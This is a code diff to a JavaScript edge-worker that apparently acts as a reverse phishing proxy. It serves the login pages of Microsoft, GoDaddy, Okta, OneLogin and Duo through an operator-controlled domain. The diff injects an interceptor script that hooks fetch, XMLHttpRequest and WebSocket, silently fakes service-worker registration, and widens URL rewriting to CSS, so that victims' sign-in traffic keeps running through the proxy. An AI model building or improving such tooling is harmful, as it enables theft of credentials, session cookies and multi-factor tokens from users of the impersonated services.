@@ -185,124 +185,153 @@ function generateInterceptorScript(upstreamDomain) {
 (function() {
   'use strict';
   
-  const PROXY_PREFIX = '${PROXY_PREFIX}';
-  const YOUR_DOMAIN = '${YOUR_DOMAIN}';
-  const CURRENT_UPSTREAM = '${upstreamDomain}';
-  
-  function shouldProxyDomain(hostname) {
-    const domains = [
-      'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',
-      'office.com', 'godaddy.com', 'secureserver.net', 'okta.com',
-      'onelogin.com', 'duosecurity.com', 'wsimg.com'
-    ];
-    return domains.some(d => hostname.includes(d));
-  }
-  
-  function rewriteUrl(url) {
-    if (!url || typeof url !== 'string') return url;
-    try {
-      // Already proxied
-      if (url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;
-      
-      // Absolute URLs with domains to proxy
-      if (url.startsWith('http')) {
-        const urlObj = new URL(url);
-        if (shouldProxyDomain(urlObj.hostname)) {
-          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search;
-        }
-        return url;
-      }
-      
-      // Protocol-relative
-      if (url.startsWith('//')) {
-        const hostname = url.split('/')[2];
-        if (shouldProxyDomain(hostname)) {
-          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);
-        }
-        return 'https:' + url;
-      }
-      
-      // Relative URLs starting with /
-      if (url.startsWith('/')) {
-        return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + url;
-      }
-      
-    } catch(e) {}
-    return url;
-  }
-  
-  // Override fetch
-  const originalFetch = window.fetch;
-  window.fetch = function(url, options) {
-    if (typeof url === 'string') {
-      url = rewriteUrl(url);
-    } else if (url instanceof Request) {
-      const newUrl = rewriteUrl(url.url);
-      if (newUrl !== url.url) {
-        url = new Request(newUrl, url);
-      }
+  try {
+    const PROXY_PREFIX = '${PROXY_PREFIX}';
+    const YOUR_DOMAIN = '${YOUR_DOMAIN}';
+    const CURRENT_UPSTREAM = '${upstreamDomain}';
+    
+    function shouldProxyDomain(hostname) {
+      if (!hostname) return false;
+      const domains = [
+        'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',
+        'office.com', 'godaddy.com', 'secureserver.net', 'okta.com',
+        'onelogin.com', 'duosecurity.com', 'wsimg.com'
+      ];
+      return domains.some(d => hostname.includes(d));
     }
-    return originalFetch.call(this, url, options);
-  };
-  
-  // Override XMLHttpRequest
-  const originalOpen = XMLHttpRequest.prototype.open;
-  XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
-    const newUrl = rewriteUrl(url);
-    return originalOpen.call(this, method, newUrl, async, user, password);
-  };
-  
-  // Override WebSocket
-  const originalWebSocket = window.WebSocket;
-  window.WebSocket = function(url, protocols) {
-    const newUrl = rewriteUrl(url);
-    return new originalWebSocket(newUrl, protocols);
-  };
-  
-  // Block Service Worker registration to prevent caching issues
-  if ('serviceWorker' in navigator) {
-    const originalRegister = navigator.serviceWorker.register;
-    navigator.serviceWorker.register = function(scriptURL, options) {
-      console.log('[Proxy] Blocking service worker registration:', scriptURL);
-      return Promise.reject(new Error('Service workers disabled in proxy mode'));
-    };
-  }
-  
-  // Monitor DOM changes to rewrite dynamically added elements
-  const observer = new MutationObserver(function(mutations) {
-    mutations.forEach(function(mutation) {
-      mutation.addedNodes.forEach(function(node) {
-        if (node.nodeType === 1) { // Element node
-          // Rewrite src/href attributes
-          if (node.src && node.src.startsWith('/') && !node.src.includes(PROXY_PREFIX)) {
-            node.src = rewriteUrl(node.src);
-          }
-          if (node.href && node.href.startsWith('/') && !node.href.includes(PROXY_PREFIX)) {
-            node.href = rewriteUrl(node.href);
-          }
-          // Check children
-          node.querySelectorAll && node.querySelectorAll('[src],[href]').forEach(function(el) {
-            if (el.src && el.src.startsWith('/') && !el.src.includes(PROXY_PREFIX)) {
-              el.src = rewriteUrl(el.src);
+    
+    function rewriteUrl(url) {
+      if (!url || typeof url !== 'string') return url;
+      try {
+        // Already proxied
+        if (url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;
+        
+        // Absolute URLs with domains to proxy
+        if (url.startsWith('http')) {
+          try {
+            const urlObj = new URL(url);
+            if (shouldProxyDomain(urlObj.hostname)) {
+              return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search;
             }
-            if (el.href && el.href.startsWith('/') && !el.href.includes(PROXY_PREFIX)) {
-              el.href = rewriteUrl(el.href);
+          } catch(e) {}
+          return url;
+        }
+        
+        // Protocol-relative
+        if (url.startsWith('//')) {
+          const hostname = url.split('/')[2];
+          if (shouldProxyDomain(hostname)) {
+            return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);
+          }
+          return 'https:' + url;
+        }
+        
+        // Relative URLs starting with /
+        if (url.startsWith('/')) {
+          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + url;
+        }
+        
+      } catch(e) {}
+      return url;
+    }
+    
+    // Override fetch
+    const originalFetch = window.fetch;
+    window.fetch = function(url, options) {
+      try {
+        if (typeof url === 'string') {
+          url = rewriteUrl(url);
+        } else if (url instanceof Request) {
+          const newUrl = rewriteUrl(url.url);
+          if (newUrl !== url.url) {
+            url = new Request(newUrl, url);
+          }
+        }
+      } catch(e) {}
+      return originalFetch.call(this, url, options);
+    };
+    
+    // Override XMLHttpRequest
+    const originalOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+      try {
+        url = rewriteUrl(url);
+      } catch(e) {}
+      return originalOpen.call(this, method, url, async, user, password);
+    };
+    
+    // Override WebSocket
+    if (window.WebSocket) {
+      const originalWebSocket = window.WebSocket;
+      window.WebSocket = function(url, protocols) {
+        try {
+          url = rewriteUrl(url);
+        } catch(e) {}
+        return new originalWebSocket(url, protocols);
+      };
+    }
+    
+    // Silent service worker suppression (return fake success to prevent errors)
+    if ('serviceWorker' in navigator) {
+      const fakeRegistration = {
+        active: null,
+        installing: null,
+        waiting: null,
+        scope: '/',
+        update: function() { return Promise.resolve(this); },
+        unregister: function() { return Promise.resolve(true); }
+      };
+      
+      navigator.serviceWorker.register = function(scriptURL, options) {
+        console.log('[Proxy] Blocking service worker:', scriptURL);
+        return Promise.resolve(fakeRegistration);
+      };
+    }
+    
+    // Monitor DOM changes to rewrite dynamically added elements
+    if (typeof MutationObserver !== 'undefined') {
+      const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          mutation.addedNodes.forEach(function(node) {
+            if (node.nodeType === 1) { // Element node
+              try {
+                // Rewrite src/href attributes
+                if (node.src && node.src.startsWith('/') && !node.src.includes(PROXY_PREFIX)) {
+                  node.src = rewriteUrl(node.src);
+                }
+                if (node.href && node.href.startsWith('/') && !node.href.includes(PROXY_PREFIX)) {
+                  node.href = rewriteUrl(node.href);
+                }
+                // Check children
+                if (node.querySelectorAll) {
+                  node.querySelectorAll('[src],[href]').forEach(function(el) {
+                    if (el.src && el.src.startsWith('/') && !el.src.includes(PROXY_PREFIX)) {
+                      el.src = rewriteUrl(el.src);
+                    }
+                    if (el.href && el.href.startsWith('/') && !el.href.includes(PROXY_PREFIX)) {
+                      el.href = rewriteUrl(el.href);
+                    }
+                  });
+                }
+              } catch(e) {}
             }
           });
-        }
+        });
       });
-    });
-  });
-  
-  if (document.body) {
-    observer.observe(document.body, { childList: true, subtree: true });
-  } else {
-    document.addEventListener('DOMContentLoaded', function() {
-      observer.observe(document.body, { childList: true, subtree: true });
-    });
+      
+      if (document.body) {
+        observer.observe(document.body, { childList: true, subtree: true });
+      } else {
+        document.addEventListener('DOMContentLoaded', function() {
+          if (document.body) observer.observe(document.body, { childList: true, subtree: true });
+        });
+      }
+    }
+    
+    console.log('[Proxy Interceptor] Active for upstream:', CURRENT_UPSTREAM);
+  } catch(err) {
+    console.error('[Proxy Interceptor] Failed to initialize:', err);
   }
-  
-  console.log('[Proxy Interceptor] Active for upstream:', CURRENT_UPSTREAM);
 })();
 </script>`;
 }
@@ -451,10 +480,12 @@ export default async function handleRequest(request) {
     
     // Rewrite body content
     const ct = resp.headers.get('content-type') || '';
-    if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
+    
+    // Process text-based content
+    if (/text\/html|application\/javascript|application\/json|text\/javascript|text\/css/.test(ct)) {
       let text = await resp.text();
       
-      // Inject base tag and interceptor at the very beginning of HTML
+      // HTML-specific processing
       if (ct.includes('text/html')) {
         const baseTag = `<base href="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/">`;
         const interceptor = generateInterceptorScript(upstreamDomain);
@@ -469,15 +500,34 @@ export default async function handleRequest(request) {
         }
       }
       
-      // Rewrite absolute URLs in CSS/JS
-      text = text.replace(
-        new RegExp(`https://(sso\\.godaddy\\.com|sso\\.secureserver\\.net|csp\\.secureserver\\.net|www\\.godaddy\\.com)`, 'g'),
-        `https://${YOUR_DOMAIN}${PROXY_PREFIX}$1`
-      );
+      // Rewrite all absolute URLs for known domains (CSS, JS, HTML)
+      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
+        const escaped = domain.replace(/\./g, '\\.');
+        // Match http:// or https:// followed by the domain
+        const regex = new RegExp(`https?://${escaped}([^"'\`\\s)]*)`, 'g');
+        text = text.replace(regex, `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}$1`);
+      });
+      
+      // Handle CSS url() references specifically
+      text = text.replace(/url\(["']?(https?:\/\/[^"')]+)["']?\)/g, (match, url) => {
+        try {
+          const urlObj = new URL(url);
+          if (shouldProxyDomain(urlObj.hostname)) {
+            return `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${urlObj.hostname}${urlObj.pathname}${urlObj.search})`;
+          }
+        } catch(e) {}
+        return match;
+      });
+      
+      // Handle relative URLs in CSS that start with /
+      if (ct.includes('text/css')) {
+        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/g, `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1)`);
+      }
       
       return new Response(text, { status: resp.status, headers: newHeaders });
     }
     
+    // For binary/static content (images, fonts), just pass through
     return new Response(resp.body, { status: resp.status, headers: newHeaders });
     
   } catch (err) {
